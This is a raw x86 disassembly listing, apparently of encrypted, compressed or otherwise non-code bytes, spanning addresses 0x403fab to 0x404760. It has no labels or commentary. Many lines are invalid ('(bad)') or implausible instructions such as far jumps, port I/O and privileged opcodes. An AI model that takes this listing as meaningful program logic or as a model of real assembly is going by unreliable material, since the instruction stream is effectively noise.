  403fab:	cmp    DWORD PTR [eax+0x7beb20ec],esp
  403fb1:	cmp    al,0x60
  403fb3:	enter  0x2c23,0x2c
  403fb7:	inc    esp
  403fb8:	iret   
  403fb9:	out    0x62,al
  403fbb:	or     edi,DWORD PTR [edx+ebp*4]
  403fbe:	or     al,0x76
  403fc0:	loope  0x403f69
  403fc2:	stos   DWORD PTR es:[edi],eax
  403fc3:	push   edx
  403fc4:	mov    dl,cl
  403fc6:	cmc    
  403fc7:	loopne 0x403fc6
  403fc9:	jge    0x403f8f
  403fcb:	dec    edx
  403fcc:	push   es
  403fcd:	mov    al,0x8
  403fcf:	(bad)  
  403fd0:	ss nop
  403fd2:	push   0x7d
  403fd4:	arpl   dx,si
  403fd6:	adc    bl,BYTE PTR [edi-0x12]
  403fd9:	jno    0x404023
  403fdb:	mov    ecx,0xf34c2366
  403fe0:	push   esp
  403fe1:	pop    edi
  403fe2:	xor    BYTE PTR [esi+0x21ab2462],al
  403fe8:	hlt    
  403fe9:	popf   
  403fea:	retf   0xfd3a
  403fed:	sbb    DWORD PTR [edx],edx
  403fef:	mov    al,ds:0xc86afcfb
  403ff4:	shl    BYTE PTR [edx+0x6a],cl
  403ff7:	out    dx,al
  403ff8:	add    al,0x10
  403ffa:	fsubr  DWORD PTR [edi]
  403ffc:	xor    eax,0x70cd45db
  404001:	dec    eax
  404002:	sahf   
  404003:	retf   0x1cfd
  404006:	in     eax,dx
  404007:	test   al,0x52
  404009:	mov    cl,0xe3
  40400b:	imul   edi,DWORD PTR [eax],0x377726b3
  404011:	push   edx
  404012:	imul   ebp,esp,0x713a72e7
  404018:	or     DWORD PTR [edx-0x44],ebx
  40401b:	scas   eax,DWORD PTR es:[edi]
  40401c:	call   0x55c0d4e3
  404021:	lock sbb al,0x8d
  404024:	imul   esi,DWORD PTR [ebx-0x31670c8],0x73a3b272
  40402e:	adc    ebx,DWORD PTR [ebx]
  404030:	(bad)  
  404031:	dec    ecx
  404032:	inc    ecx
  404033:	dec    edi
  404034:	lods   al,BYTE PTR ds:[esi]
  404035:	iret   
  404036:	xchg   edx,eax
  404037:	mov    edx,0x320539f3
  40403c:	loop   0x4040bc
  40403e:	pop    esi
  40403f:	xor    BYTE PTR [ebx+0x6d],dl
  404042:	mov    esp,0xf3894df1
  404047:	or     eax,0x55019a00
  40404c:	test   al,0xc3
  40404e:	test   al,0xb1
  404050:	or     edi,esi
  404052:	push   cs
  404053:	(bad)  [eax+0x73ad413a]
  404059:	dec    ebx
  40405a:	jl     0x404016
  40405c:	(bad)  
  40405d:	in     al,0x45
  40405f:	jb     0x4040b2
  404061:	ins    BYTE PTR es:[di],dx
  404063:	sub    DWORD PTR [ebx+eax*2+0x7f],0x41
  404068:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404069:	sbb    BYTE PTR [edx-0x64],ah
  40406c:	dec    esi
  40406d:	imul   eax,DWORD PTR [ecx+0x12],0xffffffbb
  404071:	sahf   
  404072:	pop    ebp
  404073:	mov    dh,0x67
  404075:	dec    ebx
  404076:	jecxz  0x403ffd
  404078:	inc    ebp
  404079:	jne    0x404073
  40407b:	psrld  mm0,QWORD PTR [edi]
  40407e:	cli    
  40407f:	add    DWORD PTR [esi+0x63],esp
  404082:	jo     0x404061
  404084:	mov    al,0x87
  404086:	les    ecx,FWORD PTR [eax+0x3d]
  404089:	ja     0x4040f7
  40408b:	dec    ecx
  40408c:	pop    ss
  40408d:	mov    ebp,0xdcd9ffff
  404092:	push   ds
  404093:	shl    DWORD PTR [edi-0x20d70d78],0x88
  40409a:	jo     0x4040bd
  40409c:	dec    edx
  40409d:	sbb    DWORD PTR [ebx+0x4953e7bd],edx
  4040a3:	cmp    BYTE PTR [eax+0x2506a00],bh
  4040a9:	mov    bl,0x39
  4040ab:	dec    eax
  4040ac:	mov    ds:0xd0eab745,eax
  4040b1:	sbb    al,0x6b
  4040b3:	aad    0xfa
  4040b5:	cld    
  4040b6:	pop    edx
  4040b7:	xchg   esp,edx
  4040b9:	mov    edx,0x96defc27
  4040be:	leave  
  4040bf:	mov    esi,0xa50b6bd5
  4040c4:	push   0xffffff8a
  4040c6:	add    BYTE PTR [ecx],0xdd
  4040c9:	xchg   DWORD PTR [ebp+ecx*4-0x13dde77b],edi
  4040d0:	ror    BYTE PTR [edi],1
  4040d2:	ret    0x5fbe
  4040d5:	jmp    0x404135
  4040d7:	sub    eax,0x553d7703
  4040dc:	dec    eax
  4040dd:	adc    ch,0xeb
  4040e0:	mov    dl,ah
  4040e2:	int3   
  4040e3:	shl    al,0x73
  4040e6:	aaa    
  4040e7:	call   0x5ee5:0x738c9e5b
  4040ee:	arpl   WORD PTR [edi+0x36],si
  4040f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040f2:	sbb    BYTE PTR [eax-0x78],cl
  4040f5:	(bad)  
  4040f6:	dec    esp
  4040f7:	adc    eax,0x11c3e73
  4040fc:	dec    ebx
  4040fd:	xchg   BYTE PTR [edi+0x50451c43],bh
  404103:	mov    ebx,0x9d3d3b86
  404108:	aam    0x3a
  40410a:	fidivr DWORD PTR [ebp-0x3698649b]
  404110:	sbb    al,0xc3
  404112:	mov    ah,0x47
  404114:	mov    ds:0x3fd06fe6,al
  404119:	and    ch,dh
  40411b:	jae    0x40411f
  40411d:	dec    edx
  40411e:	addr16 xchg esp,eax
  404120:	mov    ds:0x3fde7521,al
  404125:	pop    es
  404126:	mov    cl,0xfe
  404128:	mov    ebp,0x769ddd73
  40412d:	(bad)  
  40412e:	js     0x40411c
  404130:	shl    BYTE PTR [ecx],1
  404132:	inc    edi
  404133:	push   edi
  404134:	dec    eax
  404135:	cmp    eax,0x5cc19d8f
  40413a:	jg     0x40414a
  40413c:	and    BYTE PTR [eax-0x5f],bh
  40413f:	mov    ebp,eax
  404141:	xlat   BYTE PTR ds:[ebx]
  404142:	push   edi
  404143:	jnp    0x4041ac
  404145:	mov    al,ds:0xc3ccb162
  40414a:	push   es
  40414b:	clc    
  40414c:	test   ebp,ebp
  40414e:	push   eax
  40414f:	popf   
  404150:	jl     0x404177
  404152:	mov    ds:0xbfe9b217,eax
  404157:	in     al,0x32
  404159:	dec    ebx
  40415a:	jno    0x404113
  40415c:	les    esi,FWORD PTR [esi+esi*1]
  40415f:	jo     0x404183
  404161:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404162:	in     al,dx
  404163:	cmc    
  404164:	push   eax
  404165:	mov    ah,0xf6
  404167:	jbe    0x40418e
  404169:	jae    0x404145
  40416b:	push   ebx
  40416c:	push   es
  40416d:	test   DWORD PTR [edx+ecx*1],esp
  404170:	aaa    
  404171:	inc    ebp
  404172:	push   edi
  404173:	ret    0x823b
  404176:	xchg   esi,eax
  404177:	repz mov ds:0x33789612,al
  40417d:	adc    BYTE PTR [eax-0x13],bl
  404180:	loope  0x404165
  404182:	int3   
  404183:	ss pop ds
  404185:	and    dl,BYTE PTR [ecx]
  404187:	mov    esp,0xe5e1ab0a
  40418c:	jmp    0x404118
  40418e:	mov    eax,ds:0xf662c276
  404193:	push   ss
  404194:	xor    al,0xad
  404196:	jne    0x40413c
  404198:	rol    BYTE PTR [edi],cl
  40419a:	add    eax,DWORD PTR [eax]
  40419c:	mov    bl,0x7b
  40419e:	or     DWORD PTR [ebx+0x30],ebx
  4041a1:	mov    eax,0xf01b72f0
  4041a6:	fld    QWORD PTR [ebp-0x5a7f13dc]
  4041ac:	add    dh,BYTE PTR [edi+esi*2]
  4041af:	xlat   BYTE PTR ds:[ebx]
  4041b0:	pop    es
  4041b1:	loopne 0x40422f
  4041b3:	mov    ecx,DWORD PTR [esi]
  4041b5:	xchg   esp,eax
  4041b6:	fsub   QWORD PTR [edi+0x53]
  4041b9:	js     0x404171
  4041bb:	retf   0xde96
  4041be:	test   eax,0xe9f54e18
  4041c3:	jne    0x40416d
  4041c5:	cmp    ebp,DWORD PTR [edi-0x3d]
  4041c8:	pusha  
  4041c9:	fadd   QWORD PTR [edi-0x22b287ae]
  4041cf:	push   0xc3136940
  4041d4:	(bad)  
  4041d6:	add    bh,BYTE PTR [edx]
  4041d8:	sbb    DWORD PTR [eax],esp
  4041da:	dec    esp
  4041db:	inc    edx
  4041dc:	in     al,0x66
  4041de:	dec    edx
  4041df:	cs aaa 
  4041e1:	repz xor BYTE PTR [esi+eax*4-0x3d4360],0xec
  4041ea:	stos   DWORD PTR es:[edi],eax
  4041eb:	or     DWORD PTR [esi+eiz*4],ebp
  4041ee:	jecxz  0x4041cc
  4041f0:	pop    esp
  4041f1:	fisttp QWORD PTR [edi+ecx*1+0x13]
  4041f5:	and    bl,BYTE PTR [ecx-0x27]
  4041f8:	push   edi
  4041f9:	iret   
  4041fa:	shr    DWORD PTR [edx-0x64af4cac],1
  404200:	xchg   edi,eax
  404202:	add    al,0x3
  404204:	shl    DWORD PTR [ecx+0x6b690fe9],cl
  40420a:	sbb    DWORD PTR [edi+0x33],edx
  40420d:	shr    BYTE PTR [ecx],cl
  40420f:	jbe    0x4041d1
  404211:	jp     0x40428b
  404213:	dec    edx
  404214:	pop    edi
  404215:	add    al,0x9b
  404217:	ins    DWORD PTR es:[edi],dx
  404218:	stos   DWORD PTR es:[edi],eax
  404219:	jmp    0x4041a1
  40421b:	hlt    
  40421c:	mov    ebp,0x683608b6
  404221:	jecxz  0x4041de
  404223:	lods   al,BYTE PTR ds:[esi]
  404224:	es mov dl,0x4b
  404227:	add    BYTE PTR ds:0xaf93a8b2,dh
  40422d:	pop    esi
  40422e:	jbe    0x404298
  404230:	pop    esp
  404231:	in     eax,dx
  404232:	(bad)  
  404233:	push   edi
  404234:	es call 0x613f:0x82de39c9
  40423c:	and    al,0x20
  40423e:	bound  ebp,QWORD PTR [edi]
  404240:	inc    ebp
  404241:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404242:	sub    edx,DWORD PTR [ecx]
  404244:	jmp    0x404223
  404246:	mov    DWORD PTR [edx-0x5c],edx
  404249:	cmp    bl,dh
  40424b:	xor    eax,0x3f78435d
  404250:	cmc    
  404251:	rol    BYTE PTR [ecx+edx*4],cl
  404254:	nop
  404255:	scas   eax,DWORD PTR es:[edi]
  404256:	bound  edx,QWORD PTR [ebp+0x52]
  404259:	sub    eax,0x654f9a25
  40425e:	mov    DWORD PTR [ebx],esp
  404260:	xchg   esp,eax
  404261:	inc    ecx
  404262:	les    esp,FWORD PTR [ecx]
  404264:	enter  0x30df,0xc
  404268:	fiadd  WORD PTR [eax-0x5a]
  40426b:	adc    al,0x4d
  40426d:	jo     0x40425e
  40426f:	test   eax,0x3d8c12fc
  404274:	outs   dx,DWORD PTR ds:[esi]
  404275:	mov    DWORD PTR [ecx-0x21],edi
  404278:	mov    ecx,0xd05988b2
  40427d:	pop    ds
  40427e:	dec    esi
  40427f:	js     0x404276
  404281:	mov    ecx,0x459851ed
  404286:	std    
  404287:	aam    0x48
  404289:	out    0xa7,eax
  40428b:	xor    eax,0x7795f9b7
  404290:	out    dx,al
  404291:	mov    eax,0xf69aa05c
  404296:	xor    al,0xda
  404298:	cli    
  404299:	inc    ebx
  40429a:	cmp    dh,BYTE PTR [esi+0x2e8ec330]
  4042a0:	(bad)  
  4042a1:	pop    ss
  4042a2:	in     eax,dx
  4042a3:	and    BYTE PTR [eax-0xc],dl
  4042a6:	stos   DWORD PTR es:[edi],eax
  4042a7:	push   ss
  4042a8:	ret    0x1c20
  4042ab:	ficomp WORD PTR [edx-0x1d]
  4042ae:	ins    BYTE PTR es:[edi],dx
  4042af:	cmp    cl,BYTE PTR [ecx+ebx*2+0x5]
  4042b3:	mov    ch,0x16
  4042b5:	xor    al,BYTE PTR [esi+0x3c]
  4042b8:	xor    DWORD PTR [esp+eiz*2],esp
  4042bb:	ror    ecx,0xe9
  4042be:	lahf   
  4042bf:	mov    ebp,0x1ae4c1c5
  4042c4:	in     al,0xc6
  4042c6:	jne    0x40425b
  4042c8:	pop    ss
  4042c9:	pop    eax
  4042ca:	aam    0x65
  4042cc:	rcl    BYTE PTR [edx],cl
  4042ce:	imul   ebp,DWORD PTR ds:0x522bf8f0,0xdbcbdd86
  4042d8:	mov    ds:0x5cda694f,al
  4042dd:	or     BYTE PTR ds:0x88c05dab,0xd1
  4042e4:	mov    ah,0xd3
  4042e6:	mov    bl,dh
  4042e8:	pop    esi
  4042e9:	call   0x8f4e136c
  4042ee:	cmc    
  4042ef:	inc    edx
  4042f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042f1:	dec    ebx
  4042f2:	addr16 xchg edi,eax
  4042f4:	jne    0x404293
  4042f6:	cmp    dh,al
  4042f8:	lahf   
  4042f9:	dec    ecx
  4042fa:	push   edi
  4042fb:	jae    0x404347
  4042fd:	xor    BYTE PTR [ebx+0x47],bl
  404300:	mov    ds:0x637b501d,al
  404305:	and    eax,0x98782683
  40430a:	xchg   ecx,eax
  40430b:	out    0x6d,eax
  40430d:	jecxz  0x404383
  40430f:	in     eax,0x67
  404311:	jae    0x40432c
  404313:	xor    DWORD PTR [edi-0x659ab894],ebp
  404319:	or     eax,0x52ce411
  40431e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40431f:	ja     0x4042a6
  404321:	mov    dl,0x90
  404323:	int    0x96
  404325:	pop    eax
  404326:	es cmp al,0xd5
  404329:	push   esp
  40432a:	mov    fs,WORD PTR [ebp+edx*4+0x4da0617b]
  404331:	(bad)  [edx+0x6b]
  404334:	in     eax,0xbf
  404336:	pusha  
  404337:	clc    
  404338:	mov    ch,0x62
  40433a:	sbb    BYTE PTR [edi-0x112951e6],dl
  404340:	arpl   WORD PTR [eax+ecx*8],cx
  404343:	push   es
  404344:	jle    0x404300
  404346:	call   0x1ecd3a80
  40434b:	sub    DWORD PTR [ecx],0xf4e3b554
  404351:	cli    
  404352:	mov    edi,0x867acc9c
  404357:	add    eax,0xaf424eae
  40435c:	push   edi
  40435d:	mov    BYTE PTR [eax+0x7],dh
  404360:	outs   dx,DWORD PTR ds:[esi]
  404361:	ret    
  404362:	push   eax
  404363:	xor    esp,0xb8a8ba18
  404369:	clc    
  40436a:	sub    al,0x47
  40436c:	xchg   eax,ecx
  40436e:	cs mov bl,0xd6
  404371:	xchg   esi,eax
  404372:	xchg   esp,eax
  404373:	push   0x39
  404375:	or     cl,BYTE PTR [esi]
  404377:	aad    0x73
  404379:	xchg   BYTE PTR [ebp+0x52],ch
  40437c:	xor    ebp,DWORD PTR [ebp-0x6d]
  40437f:	fs aad 0xbe
  404382:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404383:	xchg   ebp,esi
  404385:	xor    BYTE PTR [edx+0x5a],ch
  404388:	pop    ds
  404389:	lock cmp eax,0x50e5120b
  40438f:	test   eax,0x4e666bf
  404394:	add    esi,DWORD PTR [esp+ecx*2+0x26d78cd]
  40439b:	popf   
  40439c:	adc    dl,BYTE PTR [ecx+ecx*2]
  40439f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043a0:	repnz rcl DWORD PTR [edi+0x22e582e1],0x52
  4043a8:	cld    
  4043a9:	xchg   ecx,eax
  4043aa:	xchg   esp,eax
  4043ab:	jg     0x404359
  4043ad:	sahf   
  4043ae:	inc    edx
  4043af:	or     ecx,esp
  4043b1:	cmp    esi,DWORD PTR ds:0x97838bc8
  4043b7:	repnz xchg ebp,eax
  4043b9:	or     BYTE PTR [ebx+0x7],0x81
  4043bd:	adc    cl,BYTE PTR [edi-0x77]
  4043c0:	js     0x4043af
  4043c2:	pop    esp
  4043c3:	jecxz  0x404411
  4043c5:	ins    BYTE PTR es:[edi],dx
  4043c6:	jnp    0x4043ef
  4043c8:	pop    es
  4043c9:	sub    BYTE PTR [eax],ch
  4043cb:	sbb    al,0xad
  4043cd:	icebp  
  4043ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043cf:	mov    cl,0x63
  4043d1:	shr    DWORD PTR [eax+0x65],1
  4043d4:	xchg   BYTE PTR [ebp+0x71da996],dl
  4043da:	sub    cl,BYTE PTR [edi]
  4043dc:	push   ebx
  4043dd:	xor    dh,al
  4043df:	or     ax,0x2441
  4043e3:	fidiv  DWORD PTR [esi+0x1f617b3]
  4043e9:	mov    bl,0xcd
  4043eb:	(bad)  
  4043ec:	pop    ds
  4043ed:	mov    ecx,DWORD PTR [ecx-0x79]
  4043f0:	jno    0x404381
  4043f2:	fadd   QWORD PTR [edi+ecx*2-0x75674dec]
  4043f9:	in     al,0x32
  4043fb:	stc    
  4043fc:	fst    QWORD PTR [eax+0x18ac3af]
  404402:	sub    bl,dl
  404404:	std    
  404405:	pop    es
  404406:	sbb    BYTE PTR [ebx-0x302e957d],ah
  40440c:	in     al,0x7d
  40440e:	push   ss
  40440f:	adc    edi,DWORD PTR [eax-0xc]
  404412:	inc    eax
  404413:	pop    ebp
  404414:	or     dh,cl
  404416:	clc    
  404417:	fwait
  404418:	mov    BYTE PTR [ebx],dh
  40441a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40441b:	fdiv   QWORD PTR [eax]
  40441d:	mov    eax,0x3e57273d
  404422:	xor    bl,BYTE PTR [esi]
  404424:	mov    ebx,0x10bbd176
  404429:	push   esi
  40442a:	mov    DWORD PTR es:[edi-0x144d1b95],ebp
  404431:	jg     0x404482
  404433:	push   ebp
  404434:	xchg   ebx,eax
  404435:	sbb    esp,ebp
  404437:	mov    cl,0xfd
  404439:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40443a:	shr    BYTE PTR [esi],cl
  40443c:	das    
  40443d:	sub    al,0x9
  40443f:	sub    ebx,edx
  404441:	mov    ah,0x79
  404443:	mov    eax,ds:0x4f93192e
  404448:	pop    ss
  404449:	(bad)  
  40444a:	scas   al,BYTE PTR es:[edi]
  40444b:	or     ah,BYTE PTR [edx]
  40444d:	sub    bl,BYTE PTR [ebx]
  40444f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404450:	sub    DWORD PTR [edi+0x31ae3e29],esp
  404456:	mov    DWORD PTR [eax-0x12],ebx
  404459:	ret    0x8101
  40445c:	cmp    ecx,ebp
  40445e:	mov    edi,0xb6ef07a3
  404463:	xchg   edi,eax
  404464:	ret    0x713e
  404467:	dec    esp
  404468:	mov    ds:0x19fccf60,al
  40446d:	nop
  40446e:	mov    dh,0x92
  404470:	push   0x13
  404472:	mov    edx,0x7ccafdf9
  404477:	xor    al,0x45
  404479:	dec    edi
  40447a:	(bad)  
  40447d:	call   0xed57:0x81e86a33
  404484:	pushf  
  404485:	ins    DWORD PTR es:[edi],dx
  404486:	mov    ecx,edi
  404488:	inc    ebx
  404489:	aam    0x87
  40448b:	loope  0x40444b
  40448d:	mov    bh,0x0
  40448f:	fistp  WORD PTR [ebp+0x72]
  404492:	cmp    al,0x1f
  404494:	sar    dh,cl
  404496:	mov    dh,0x11
  404498:	stos   DWORD PTR es:[edi],eax
  404499:	jge    0x40446d
  40449b:	jmp    0x755d:0x1c6906c8
  4044a2:	jno    0x404440
  4044a4:	mul    al
  4044a6:	sub    ecx,edx
  4044a8:	dec    eax
  4044a9:	cmp    BYTE PTR [edx],al
  4044ab:	jge    0x40448d
  4044ad:	jge    0x40445b
  4044af:	mov    es,WORD PTR [ebx+0x2a]
  4044b2:	adc    eax,0xb1caa770
  4044b7:	xchg   ecx,eax
  4044b8:	mov    ds:0x96622f9c,eax
  4044bd:	mov    ah,BYTE PTR [esi]
  4044bf:	push   cs
  4044c0:	dec    esp
  4044c1:	mov    esp,0x92a204bd
  4044c6:	pop    ds
  4044c7:	dec    ebp
  4044c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044c9:	icebp  
  4044ca:	cmp    al,0x9e
  4044cc:	das    
  4044cd:	ja     0x4044dd
  4044cf:	lods   al,BYTE PTR ds:[esi]
  4044d0:	push   0xc6256c2b
  4044d5:	sbb    BYTE PTR [ecx+0x6a32063f],ah
  4044db:	pop    ss
  4044dc:	loopne 0x4044da
  4044de:	aas    
  4044df:	xor    DWORD PTR [ecx+0x5d],0xffffffd6
  4044e3:	cs stos BYTE PTR es:[edi],al
  4044e5:	int3   
  4044e6:	jmp    0xee4c:0xb8890d8d
  4044ed:	stc    
  4044ee:	xchg   ecx,eax
  4044ef:	cmp    eax,0x97eb9ac4
  4044f4:	mov    dh,0xc
  4044f6:	mov    ch,bh
  4044f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044f9:	imul   edx
  4044fb:	mov    eax,0x4cb31065
  404500:	pop    edx
  404501:	ret    
  404502:	inc    ebx
  404503:	arpl   WORD PTR [ecx+0x59d7fd2d],sp
  404509:	xor    ebx,DWORD PTR [edx]
  40450b:	les    ebp,FWORD PTR [ebx+0x61ef6e28]
  404511:	xchg   esi,eax
  404512:	or     eax,0x128ad485
  404517:	jb     0x404569
  404519:	fild   DWORD PTR [ebx-0x18]
  40451c:	mov    ebx,0x470e44b
  404521:	lock mov ch,bh
  404524:	pushf  
  404525:	or     al,0xb0
  404527:	cmp    al,0x24
  404529:	pusha  
  40452a:	or     BYTE PTR [edx+0x78],bl
  40452d:	pushf  
  40452e:	add    eax,0x398888c
  404533:	or     bh,bl
  404535:	nop
  404536:	fadd   DWORD PTR [eax+0x15]
  404539:	pop    ecx
  40453a:	rol    BYTE PTR [edi-0x5b],cl
  40453d:	in     eax,dx
  40453e:	in     eax,dx
  40453f:	adc    dl,BYTE PTR [edi+0x8]
  404542:	jne    0x4045ba
  404544:	pop    edx
  404545:	sbb    DWORD PTR [ecx+0x25],ebx
  404548:	(bad)  
  404549:	in     eax,0x22
  40454b:	xor    ch,ah
  40454d:	loope  0x40456e
  40454f:	xor    DWORD PTR [edx],ebx
  404551:	xchg   ecx,eax
  404552:	mov    edx,0x3ddead92
  404557:	dec    edi
  404558:	mov    DWORD PTR [esi+0x55],ebp
  40455b:	mov    ds:0xb1ec0610,eax
  404560:	loop   0x4045c0
  404562:	retf   0xd69e
  404565:	xor    BYTE PTR [ecx-0x22f5558d],bh
  40456b:	and    dl,ah
  40456d:	pop    es
  40456e:	nop
  40456f:	xlat   BYTE PTR ds:[ebx]
  404570:	imul   ebx,DWORD PTR [edx+0x4c],0xaf9abcb1
  404577:	xor    bl,BYTE PTR [ecx+0x70]
  40457a:	mov    dh,0x4d
  40457c:	add    eax,0x3156199d
  404581:	push   esi
  404582:	call   0x138d4be4
  404587:	jmp    0x4045f2
  404589:	int    0x2f
  40458b:	pop    ebx
  40458c:	jbe    0x40459e
  40458e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40458f:	and    bh,al
  404591:	out    dx,eax
  404592:	and    ah,BYTE PTR [eax-0x7a]
  404595:	adc    BYTE PTR ds:0xa821ebe5,cl
  40459b:	aam    0xd8
  40459d:	cwde   
  40459e:	jp     0x404574
  4045a0:	mov    WORD PTR [ebp-0x55e76f81],fs
  4045a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045a7:	sbb    eax,0xfca24883
  4045ac:	ins    DWORD PTR es:[edi],dx
  4045ad:	sahf   
  4045ae:	sub    al,0x2c
  4045b0:	mov    ah,0x9d
  4045b2:	or     BYTE PTR cs:[edx-0x1e],cl
  4045b6:	push   es
  4045b7:	dec    eax
  4045b8:	cmp    al,BYTE PTR [ebp+0x46b8f876]
  4045be:	aam    0xfb
  4045c0:	lea    edx,[eax]
  4045c2:	jecxz  0x404637
  4045c4:	and    eax,0xcc8e4c5d
  4045c9:	jle    0x4045a7
  4045cb:	outs   dx,BYTE PTR ds:[esi]
  4045cc:	scas   eax,DWORD PTR es:[edi]
  4045cd:	call   0x10e0:0x88122d6b
  4045d4:	xlat   BYTE PTR ds:[ebx]
  4045d5:	inc    edi
  4045d6:	aam    0x4b
  4045d8:	in     eax,dx
  4045d9:	int    0x56
  4045db:	test   BYTE PTR [esp+esi*1+0x5a69c643],ch
  4045e2:	push   eax
  4045e3:	pop    ebp
  4045e4:	adc    eax,0x5aed88d6
  4045e9:	push   esp
  4045ea:	test   eax,0xc143b496
  4045ef:	arpl   bp,sp
  4045f1:	sub    BYTE PTR [edx-0x12a8e1dc],dl
  4045f7:	xor    DWORD PTR [edx-0x69],ebp
  4045fa:	rcl    BYTE PTR [edx],1
  4045fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045fd:	xchg   ecx,eax
  4045fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045ff:	in     al,dx
  404600:	in     al,dx
  404601:	jge    0x404624
  404603:	call   DWORD PTR [ecx-0x37]
  404606:	add    DWORD PTR [edi],edx
  404608:	clc    
  404609:	sub    ecx,DWORD PTR [ecx+0x1366b1ef]
  40460f:	fistp  DWORD PTR [ebp+ebx*4-0x28a231fe]
  404616:	lock push ecx
  404618:	or     bl,dh
  40461a:	mov    edi,0xa33f66a8
  40461f:	pop    ebp
  404620:	test   esi,edx
  404622:	dec    eax
  404623:	shl    BYTE PTR [edi+0x2a],0x76
  404627:	push   es
  404628:	adc    ch,BYTE PTR [ebx]
  40462a:	aam    0x85
  40462c:	xlat   BYTE PTR ds:[ebx]
  40462d:	mov    BYTE PTR [esi-0x3b0253e],dl
  404633:	inc    ecx
  404634:	mov    dh,0x62
  404636:	push   ebx
  404637:	and    bh,dl
  404639:	or     ebx,DWORD PTR [eax]
  40463b:	scas   eax,DWORD PTR es:[edi]
  40463c:	stc    
  40463d:	xor    ebx,DWORD PTR [edx+0x21fb083c]
  404643:	add    esi,DWORD PTR [ebx]
  404645:	mov    DWORD PTR [ebp-0x1d],0x4bb8c35d
  40464c:	aaa    
  40464d:	popf   
  40464e:	jns    0x40461f
  404650:	push   ebp
  404651:	rcr    DWORD PTR [ebx+0x78701490],1
  404657:	add    BYTE PTR [edi],0xe2
  40465a:	or     BYTE PTR [ebp+0x2488199d],bh
  404660:	lock dec ecx
  404662:	ins    DWORD PTR es:[edi],dx
  404663:	push   ebp
  404664:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404665:	push   edx
  404666:	(bad)  
  404668:	lea    eax,[edx]
  40466a:	and    cl,BYTE PTR [eax+0x608a4a0e]
  404670:	std    
  404671:	mov    al,BYTE PTR [esi+0x26d0417d]
  404677:	sbb    ecx,DWORD PTR [esp+ebp*4]
  40467a:	jno    0x40464f
  40467c:	aaa    
  40467d:	add    al,0x67
  40467f:	nop
  404680:	cmp    BYTE PTR [ebp-0x1f],bl
  404683:	es push cs
  404685:	stc    
  404686:	dec    esi
  404687:	jnp    0x4046c8
  404689:	dec    esi
  40468a:	push   esp
  40468b:	dec    eax
  40468c:	mov    esp,0xd42f39fe
  404691:	in     eax,0x41
  404693:	mov    ch,0xca
  404695:	lds    esp,FWORD PTR [eax]
  404697:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404698:	cdq    
  404699:	sub    esp,0x25
  40469c:	cld    
  40469d:	mov    bl,0x3e
  40469f:	push   ds
  4046a0:	pop    edx
  4046a1:	mov    eax,eax
  4046a3:	es add eax,0xde326dd9
  4046a9:	push   ecx
  4046aa:	sbb    al,0x30
  4046ac:	sub    eax,0x9693a9b5
  4046b1:	(bad)  
  4046b2:	stos   DWORD PTR es:[edi],eax
  4046b3:	test   al,0x1d
  4046b5:	iret   
  4046b6:	push   0xfffffff9
  4046b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046b9:	lahf   
  4046ba:	jae    0x404643
  4046bc:	nop
  4046bd:	jne    0x4046c4
  4046bf:	js     0x404736
  4046c1:	jmp    0x747cb60f
  4046c6:	xchg   esp,eax
  4046c7:	enter  0xc146,0x1b
  4046cb:	jmp    0x1e5:0xa522af4d
  4046d2:	inc    ebx
  4046d3:	into   
  4046d4:	sub    bh,BYTE PTR [edi]
  4046d6:	pusha  
  4046d7:	push   es
  4046d8:	fs call 0x58454fc5
  4046de:	dec    esp
  4046df:	pop    ds
  4046e0:	xor    al,0x76
  4046e2:	mov    esi,0x4d629b14
  4046e7:	pop    ss
  4046e8:	lds    ebx,FWORD PTR [eax-0x75063f7e]
  4046ee:	jo     0x4046c6
  4046f0:	jae    0x404703
  4046f2:	(bad)  
  4046f3:	es cmp edi,ecx
  4046f6:	jae    0x4046e3
  4046f8:	call   0x13b0:0xd540e270
  4046ff:	sub    DWORD PTR [esi-0x14],0xf2ec6cbf
  404706:	sub    bh,0x38
  404709:	mov    bh,0x8b
  40470b:	ja     0x404744
  40470d:	pusha  
  40470e:	rcl    dh,cl
  404710:	push   0xffffffe6
  404712:	cmp    ebp,DWORD PTR [ebx+eiz*4]
  404715:	push   0xffffffa4
  404717:	jecxz  0x404763
  404719:	test   DWORD PTR [ecx+0x1bb133ae],edx
  40471f:	enter  0x657c,0x35
  404723:	rol    DWORD PTR [edx+0x58],0x3
  404727:	mov    dl,0x74
  404729:	dec    esp
  40472a:	jmp    0x1682:0x65e6e27b
  404731:	jmp    0x4046e9
  404733:	mov    ss,WORD PTR [ebx]
  404735:	xor    bl,bl
  404737:	in     eax,0x57
  404739:	mov    esp,0x336f32e4
  40473e:	inc    ebp
  40473f:	aas    
  404740:	aas    
  404741:	sbb    eax,DWORD PTR [edx+0x3e]
  404744:	arpl   sp,cx
  404746:	jge    0x4046ea
  404748:	mov    ebp,0x7a954ac2
  40474d:	nop
  40474e:	push   esi
  40474f:	ins    DWORD PTR es:[edi],dx
  404750:	jl     0x404713
  404752:	ss ds (bad) 
  404755:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404757:	sbb    al,0xfd
  404759:	mov    esi,0x61a96ad6
  40475e:	sub    edi,ebp
  404760:	fmul   DWORD PTR [ecx+0x2d53def3]
